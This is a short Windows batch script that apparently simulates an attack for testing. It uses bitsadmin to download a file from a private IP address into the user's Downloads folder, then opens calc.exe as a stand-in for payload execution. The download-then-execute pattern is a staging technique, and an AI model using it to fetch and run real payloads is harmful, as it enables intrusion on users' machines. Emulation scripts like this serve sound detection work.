@echo off
REM Simulate malicious download using bitsadmin
bitsadmin /transfer myJob /download /priority normal http://192.168.100.29:8080/hello.txt %USERPROFILE%\Downloads\hello.txt

REM Simulate payload execution by opening calculator
start calc.exe
